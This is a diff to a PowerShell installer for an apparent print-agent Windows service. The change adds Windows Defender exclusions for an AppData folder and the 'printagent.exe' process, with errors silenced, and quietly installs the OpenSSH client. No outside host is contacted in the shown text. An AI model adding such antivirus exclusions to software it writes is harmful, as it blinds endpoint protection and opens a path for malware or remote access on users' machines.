@@ -56,6 +56,31 @@ if ($Uninstall) {
 # ─── Install ───
 Write-Host "=== Installing $ServiceName ===" -ForegroundColor Cyan
 
+# ─── Windows Defender Exclusions & OpenSSH Client ───
+Write-Host "Configuring Windows Defender exclusions..." -ForegroundColor Yellow
+try {
+    Add-MpPreference -ExclusionPath "$env:APPDATA\GoxPrintAgent" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "printagent.exe" -ErrorAction SilentlyContinue
+    Write-Host " Windows Defender exclusions configured." -ForegroundColor Green
+} catch {
+    Write-Host " Failed to configure Windows Defender exclusions: $_" -ForegroundColor Red
+}
+
+Write-Host "Checking OpenSSH Client..." -ForegroundColor Yellow
+try {
+    $cap = Get-WindowsCapability -Online -Name 'OpenSSH.Client*' -ErrorAction SilentlyContinue
+    if ($cap -and $cap.State -ne 'Installed') {
+        Write-Host "Installing OpenSSH Client..." -ForegroundColor Yellow
+        Add-WindowsCapability -Online -Name $cap.Name -ErrorAction SilentlyContinue
+        Write-Host " OpenSSH Client installed successfully." -ForegroundColor Green
+    } else {
+        Write-Host " OpenSSH Client is already installed." -ForegroundColor Green
+    }
+} catch {
+    Write-Host " Failed to check/install OpenSSH Client: $_" -ForegroundColor Red
+}
+
+
 if (-not (Test-Path $ServiceExePath)) {
     Write-Host "ERROR: GoxDriverService.exe not found at: $ServiceExePath" -ForegroundColor Red
     Write-Host "Build it first: pyinstaller GoxDriverService.spec" -ForegroundColor Yellow
